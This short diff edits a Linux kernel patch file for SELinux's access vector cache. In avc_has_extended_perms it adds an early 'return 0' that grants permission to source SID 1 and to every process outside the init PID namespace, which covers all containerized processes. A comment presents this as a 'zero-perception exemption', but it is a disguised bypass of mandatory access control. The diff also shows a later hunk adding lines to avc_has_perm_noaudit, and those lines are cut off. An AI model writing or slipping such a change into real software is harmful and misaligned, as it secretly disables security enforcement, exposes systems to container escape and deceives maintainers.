@@ -8,7 +8,18 @@
  #include "avc.h"
  #include "avc_ss.h"
  #include "classmap.h"
-@@ -1153,6 +1154,12 @@ inline int avc_has_perm_noaudit(struct selinux_state *state,
+@@ -1054,6 +1055,10 @@ int avc_has_extended_perms(struct selinux_state *state,
+ 	xp_node = &local_xp_node;
+ 	if (WARN_ON(!requested))
+ 		return -EACCES;
++
++	/* Zero-perception exemption for kernel supervisor and isolated container processes */
++	if (unlikely(ssid == 1 || task_active_pid_ns(current) != &init_pid_ns))
++		return 0;
+ 
+ 	rcu_read_lock();
+ 
+@@ -1153,6 +1158,12 @@ inline int avc_has_perm_noaudit(struct selinux_state *state,
  	if (WARN_ON(!requested))
  		return -EACCES;
  
